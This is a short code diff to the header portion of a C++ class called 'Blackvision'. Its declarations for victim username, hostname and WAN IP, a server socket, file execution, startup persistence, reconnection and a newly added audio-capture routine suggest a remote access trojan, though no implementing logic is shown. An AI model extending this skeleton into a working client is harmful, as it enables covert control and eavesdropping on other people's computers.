@@ -13,8 +13,9 @@
 #include <sstream>
 #include <fstream>
 
-#pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "ws2_32.lib") //ws2_32
+#pragma comment(lib, "wininet.lib") //wininet
+#pragma comment(lib, "winmm.lib") // winmm
 #define BUFFER 1024
 
 
@@ -22,10 +23,10 @@ static bool connected = false;
 // ZeroMemory < memset
 class Blackvision {
 public:
-	char username[UNLEN+1];
+	char username[UNLEN + 1];
 	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
 	TCHAR DIR[MAX_PATH];
-	DWORD len = UNLEN+1;
+	DWORD len = UNLEN + 1;
 	DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
 	char wanip[500];
 	SOCKET sockfd;
@@ -33,6 +34,7 @@ public:
 	char* file_commands[5];
 	char* msgbox[5];
 	char* fcommands[5];
+	char* audio[5];
 	char* cmd[5];
 	char filebuf[BUFFER];
 	struct sockaddr_in server;
@@ -46,6 +48,7 @@ public:
 	void ExecuteFile(char* filename);
 	void startup();
 	void reconnect();
+	DWORD WINAPI Audio(LPVOID lpParameter);
 };
 
 
